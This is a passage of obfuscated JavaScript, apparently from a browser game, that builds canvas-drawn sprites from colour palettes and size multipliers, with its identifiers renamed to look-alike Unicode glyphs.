			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠΔΔᐃᐃᐃ(.9 * ᐃ, [ⵠ[341], ⵠ[407], "#c41c50", "#2c2e2d", "#c63450", "#f7e7f0"]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠΔΔᐃᐃᐃ(ᐃ * .9, [ⵠ[343], "#1a847f", ⵠ[377], "#131919", "#01333a", "#b6f2db"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆⲆⲆⵠΔⲆ(ᐃ * .9, [ⵠ[341], ⵠ[407], "#c41c50", "#c63450", ⵠ[407], "#f7e7f0", "#2b2d2d"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆⲆⲆⵠΔⲆ(.9 * ᐃ, [ⵠ[343], "#1a847f", ⵠ[377], "#01333a", ⵠ[407], "#b6f2db", "#2b2d2d"]));
			ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ] = [];
			for (var ⵠᐃ = ΔᐃΔΔ; 2 > ⵠᐃ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ][ⵠᐃ] = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ][ⵠᐃ].width = 193;
				ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ][ⵠᐃ].height = 193;
				ⵠⲆ[Ⲇ.ⲆⲆΔⲆΔ][ⵠᐃ] = ⵠⲆ[Ⲇ.ⵠΔᐃⲆⵠΔᐃ][ⵠᐃ].getContext(ⵠ[289]);
				ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ][ⵠᐃ] = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ][ⵠᐃ].width = 600;
				ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ][ⵠᐃ].height = 600;
				ⵠⲆ[Ⲇ.Ⲇᐃⵠⵠᐃ][ⵠᐃ] = ⵠⲆ[Ⲇ.ⲆⵠΔΔⵠⵠⲆ][ⵠᐃ].getContext(ⵠ[289])
			}
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#c8e0de"]));
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#147071"]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#231912"]));
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#021719"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⵠᐃⲆΔ] = ⵠᐃⵠ(ᐃⲆᐃⲆᐃⵠⲆΔⵠ(.5 * ᐃ, [ⵠ[212]]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⵠΔⵠ] = ⵠᐃⵠ(ΔⲆⵠΔΔⲆᐃⲆⲆ(.9 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃⲆᐃᐃ] = ⵠᐃⵠ(ⲆⵠⵠⲆᐃΔⲆⲆⵠ(.9 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃΔⵠ] = ⵠᐃⵠ(ⵠᐃⵠⲆᐃΔᐃⲆΔ(ᐃ * ᐃⲆᐃ, [ⵠ[212]]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⲆⲆ] = ⵠᐃⵠ(ⲆⲆⵠⵠᐃΔⲆⲆⵠ(.8 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⵠΔΔ] = ⵠᐃⵠ(ΔⵠΔΔᐃⵠᐃᐃⲆ(.8 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃΔΔⲆⵠ] = ⵠᐃⵠ(ⵠⲆΔΔⵠΔΔᐃⵠ(.9 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ⵠΔΔΔ] = ⵠᐃⵠ(ⲆΔᐃᐃᐃⲆΔ(.6 * ᐃ, ⵠ[212]));
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆᐃ] = ⵠᐃⵠ(ⲆΔᐃᐃᐃⲆΔ(.6 * ᐃ, "#1CE7E0"));
			ⵠⲆ[Ⲇ.ⵠΔΔᐃᐃⲆⵠ] = ⵠᐃⵠ(ⲆΔᐃᐃᐃⲆΔ(.6 * ᐃ, "#DBE71C"));
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃⵠⵠΔ] = ⵠᐃⵠ(ⲆΔᐃᐃᐃⲆΔ(ᐃ * .6, "#00BB00"));
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#dac291"]));
			ⵠⲆ[Ⲇ.ΔᐃΔⵠⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#0D423D"]));
			ⵠⲆ[Ⲇ.ΔΔΔΔⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔΔⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#dac291"]));
			ⵠⲆ[Ⲇ.ΔΔΔΔⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔΔΔⵠ(ᐃ, ["#0D423D"]));
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠΔΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠᐃⲆΔⵠⲆ(ᐃ * .3, true, [ⵠ[187], "#717273", "#606162", "#a09f9f", "#878787", "#1a6470"]));
			ⵠⲆ[Ⲇ.ⵠⲆΔΔⵠΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠᐃⲆΔⵠⲆ(ᐃ * .3, true, [ⵠ[187], ⵠ[84], ⵠ[88], "#245d5d", "#1f5454", ⵠ[283]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠᐃⲆΔⵠⲆ(.3 * ᐃ, true, [ⵠ[187], "#717273", "#606162", "#a09f9f", "#878787", ⵠ[265]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠΔⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠᐃⲆΔⵠⲆ(ᐃ * .3, ⵠⲆⵠⵠΔ, [ⵠ[187], ⵠ[84], ⵠ[88], "#245d5d", "#1f5454", "#0b2121"]));
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃᐃ] = [ⵠᐃⵠ(ΔⵠᐃⲆᐃⵠΔ(ᐃ, ⲆⵠⵠᐃⲆ, [ⵠ[504], ⵠ[323], ⵠ[100], ⵠ[474], ⵠ[472], ⵠ[523], ⵠ[129]]))];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆᐃ] = [ⵠᐃⵠ(ΔⵠᐃⲆᐃⵠΔ(ᐃ, true, [ⵠ[504], ⵠ[323], ⵠ[100], ⵠ[474], ⵠ[472], ⵠ[523], ⵠ[129]]))];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔᐃᐃΔⵠΔⵠ(1 * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠᐃⲆΔⵠⵠⵠ(1 * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃΔᐃⵠΔΔᐃ(ᐃ * ⲆⵠⲆⲆ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔⵠΔΔᐃΔΔ(1 * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃⵠᐃⵠᐃⵠ(ⵠΔᐃ * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔΔⵠΔΔᐃΔ(ΔⲆⵠ * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔΔᐃⵠΔⵠ(ⵠΔⵠΔ * ᐃ, [ⵠ[124]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔᐃᐃΔⵠΔⵠ(ᐃ * 1, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠᐃⲆΔⵠⵠⵠ(ᐃ * ⵠΔᐃ, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃΔᐃⵠΔΔᐃ(ᐃ * ΔΔΔ, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔⵠΔΔᐃΔΔ(ⵠΔⵠΔ * ᐃ, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃⵠᐃⵠᐃⵠ(ᐃ * 1, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔΔⵠΔΔᐃΔ(ᐃ * ΔΔᐃⵠ, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔΔᐃⵠΔⵠ(ᐃ * ΔⵠΔⵠ, [ⵠ[283]])));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.7 * ᐃ, ["#FBEFBC"], 0)));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.9 * ᐃ, ["#FBEFBC"], ᐃᐃⲆΔ)));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.7 * ᐃ, ["#FBEFBC"], ⲆⲆΔᐃ)));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.7 * ᐃ, ["#0F4C48"], 0)));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.9 * ᐃ, ["#0F4C48"], ΔⵠⲆΔ)));
			ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.7 * ᐃ, ["#0F4C48"], 2)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.8 * ᐃ, [ⵠ[122]], 0)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 2, [ⵠ[122]], 1)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.8 * ᐃ, [ⵠ[122]], ⲆⵠΔΔ)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 1.8, [ⵠ[61]], 0)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * ⲆⲆΔᐃ, [ⵠ[61]], 1)));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.8 * ᐃ, [ⵠ[61]], 2)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 1.9, [ⵠ[303]], ΔⲆⲆ)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 2.1, [ⵠ[303]], 1)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(1.9 * ᐃ, [ⵠ[303]], 2)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 1.9, [ⵠ[97]], 0)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(2.1 * ᐃ, [ⵠ[97]], ΔᐃᐃⲆ)));
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃᐃᐃⲆⲆ(ᐃ * 1.9, [ⵠ[97]], Ⲇᐃᐃⵠ)));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(.8 * ᐃ, ["#231F20", "#0c8e5b", "#037542", ⵠ[344]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(ᐃ * ΔⲆⵠ, ["#231F20", "#0c8e5b", "#037542", ⵠ[344]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(1.2 * ᐃ, ["#231F20", "#0c8e5b", "#037542", ⵠ[344]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(ᐃ * .8, ["#041e22", ⵠ[325], ⵠ[118], ⵠ[275]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(1 * ᐃ, ["#041e22", ⵠ[325], ⵠ[118], ⵠ[275]])));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠΔⵠΔΔⵠᐃ(ᐃ * 1.2, ["#041e22", ⵠ[325], ⵠ[118], ⵠ[275]])));
			ⵠⲆ[Ⲇ.ᐃΔΔᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔΔᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠΔΔⵠᐃⲆ(.8 * ᐃ, [ⵠ[187], ⵠ[545], "#201851", ⵠ[409], "#F4F4F4", "#D3D3D3", "#6765CE", "#593CC6", "#433BAD", ⵠ[409], "#052830", ⵠ[129], ⵠ[545], ⵠ[210]]));
			ⵠⲆ[Ⲇ.ᐃΔΔᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠΔΔⵠᐃⲆ(.8 * ᐃ, [ⵠ[399], ⵠ[42], "#081B2D", ⵠ[409], "#9AAAAD", "#72898C", "#133556", "#296D9B", "#25557C", "#133556", "#0D2A42", ⵠ[129], ⵠ[42], "#72898C"]));
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⵠⵠᐃ] = ⵠᐃⵠ(ⵠᐃⵠⲆⲆΔⵠᐃⲆ(ᐃ * .8, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠΔⲆᐃⲆⵠ(ᐃ * .8, ⵠⲆⵠⵠΔ, [ⵠ[187], "#961B1B", "#702727", "#C43B3B", "#d15151", "#B71C1C", "#E8E8E8", "#752E2E", "#891818"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠΔⲆᐃⲆⵠ(ᐃ * .8, true, [ⵠ[399], ⵠ[389], ⵠ[4], ⵠ[42], "#321C56", "#1C073D", ⵠ[210], "#1C0833", "#1B1238"]));
			ⵠⲆ[Ⲇ.ᐃΔᐃᐃᐃΔⵠ] = ⵠᐃⵠ(ⲆⵠᐃᐃⲆΔΔΔΔ(ᐃ * .8, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ⵠᐃΔΔⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔΔⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(ᐃ * .4, ⲆⵠⵠᐃⲆ, [ⵠ[187], "#db6f26", ⵠ[407], ⵠ[339], "#833813"], 0));
			ⵠⲆ[Ⲇ.ⵠᐃΔΔⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(ᐃ * .4, ⲆᐃΔⲆⲆ, [ⵠ[399], ⵠ[389], ⵠ[4], ⵠ[42]], ⵠⲆⲆ));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(.4 * ᐃ, ⵠᐃⲆᐃΔ, [ⵠ[187], "#d35e35", ⵠ[407], ⵠ[339], ⵠ[339]], ΔⵠⲆΔ));
			ⵠⲆ[Ⲇ.ⲆᐃᐃⲆⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(.4 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[399], ⵠ[389], ⵠ[ⵠΔᐃΔ], ⵠ[42]], 1));
			ⵠⲆ[Ⲇ.ⲆᐃᐃᐃΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃᐃΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(.4 * ᐃ, ⵠⲆⲆⵠᐃ, [ⵠ[187], "#2973a5", ⵠ[407], "#ffff00", ⵠ[339], "#03243f", "#f2ec30", "#162f6d"], 0));
			ⵠⲆ[Ⲇ.ⲆᐃᐃᐃΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⵠⵠᐃⲆⲆᐃ(.4 * ᐃ, true, [ⵠ[399], ⵠ[389], ⵠ[4], ⵠ[42]], 0));
			ⵠⲆ[Ⲇ.ⲆⲆΔΔᐃⵠΔ] = ⵠᐃⵠ(ⵠΔΔⲆⲆⲆΔ(ᐃ * .4, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃᐃΔΔ] = ⵠᐃⵠ(ⵠΔΔⲆⲆⲆΔ(ᐃ * .4, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃⲆᐃᐃⲆ] = ⵠᐃⵠ(ⵠΔΔⲆⲆⲆΔ(.4 * ᐃ, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ᐃΔΔΔⵠ] = ⵠᐃⵠ(ᐃΔⵠⵠᐃΔⲆ(.35 * ᐃ, ⵠⲆΔᐃⲆ, [ⵠ[111], ⵠ[71], ⵠ[106], ⵠ[248], ⵠ[71]], 1));
			ⵠⲆ[Ⲇ.ΔⵠⲆΔⵠ] = ⵠᐃⵠ(ᐃⵠⲆᐃᐃⲆⵠ(ᐃ * .35, ΔᐃΔΔⵠ, [ⵠ[187], "#ed5f4f", "#ce4545", ⵠ[407], "#e2dad7"], ΔΔΔ));
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃΔⵠⲆΔΔ(.35 * ᐃ, true, [ⵠ[187], ⵠ[281], ⵠ[545], ⵠ[545], ⵠ[210]], ⵠΔⲆ));
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆΔᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃΔⵠⲆΔΔ(ᐃ * .35, ⲆⵠⵠᐃⲆ, [ⵠ[399], "#613577", ⵠ[42], "#1C073D", ⵠ[210]], ᐃᐃⲆΔ));
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃΔⵠⲆΔΔ(ᐃ * .35, ⲆⲆΔⲆⲆ, [ⵠ[187], ⵠ[281], ⵠ[407], "#181414", ⵠ[210]], 0));
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃΔⵠⲆΔΔ(ᐃ * .35, ᐃⵠΔᐃΔ, [ⵠ[399], ⵠ[241], "#563f83", "#180f21", ⵠ[210]], ⵠⲆⲆ));
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(.35 * ᐃ, ⵠⵠⲆⲆΔ, [ⵠ[187], ⵠ[281], ⵠ[407]]));
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⵠⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(.35 * ᐃ, ⵠⵠⲆⲆΔ, [ⵠ[399], ⵠ[241], "#563f83"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆⵠⲆⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(ᐃ * .42, ΔᐃΔΔⵠ, [ⵠ[187], ⵠ[281], ⵠ[407]]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⲆⵠⲆⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(ᐃ * .42, true, [ⵠ[399], ⵠ[241], "#563f83"]));
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(ᐃ * .35, true, [ⵠ[187], ⵠ[281], ⵠ[545]]));
			ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(.35 * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[399], "#613577", ⵠ[42]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(.42 * ᐃ, true, [ⵠ[187], ⵠ[281], ⵠ[545]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(.42 * ᐃ, true, [ⵠ[399], "#613577", ⵠ[42]]));
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆⲆⲆⵠ] = ⵠᐃⵠ(ⲆⵠⲆΔⲆᐃⵠ(.35 * ᐃ, [ⵠ[545]]));
			ⵠⲆ[Ⲇ.ΔΔΔⲆᐃΔΔ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(.35 * ᐃ, true, [ᐃⲆᐃⲆⲆ, ⵠ[545]]));
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠᐃⵠⲆ] = ⵠᐃⵠ(ΔΔᐃΔΔΔᐃ(.35 * ᐃ, ⵠⲆΔᐃⲆ, [undefined, ⵠ[545]]));
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠᐃⵠᐃ] = ⵠᐃⵠ(ⲆⵠⲆΔⲆᐃⵠ(.35 * ᐃ, ["#22E066"]));
			ⵠⲆ[Ⲇ.ⵠⲆΔⲆΔΔⲆ] = ⵠᐃⵠ(ΔⵠᐃⲆⲆᐃⲆ(ᐃ * .35, true, [undefined, "#22E066"]));
